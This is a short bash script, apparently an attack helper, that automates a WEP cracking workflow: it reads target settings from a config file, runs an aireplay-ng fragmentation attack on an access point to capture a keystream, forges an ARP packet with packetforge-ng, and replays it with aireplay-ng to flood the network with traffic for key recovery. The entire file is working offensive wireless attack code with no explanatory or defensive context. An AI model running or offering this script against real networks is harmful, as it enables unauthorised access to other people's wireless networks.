#!/bin/bash

source config.txt

aireplay-ng -5 -b "$ap_mac" -h "$local_mac" "$interface"

KEYSTREAM=$(ls -t *.xor 2>/dev/null | head -1)

packetforge-ng --arp \
  -y "$KEYSTREAM" \
  -a "$ap_mac" \
  -h "$local_mac" \
  -k 255.255.255.255 \
  -l 255.255.255.255 \
  -w output.cap

aireplay-ng -3 -b "$ap_mac" -h "$local_mac" -r output.cap "$interface"
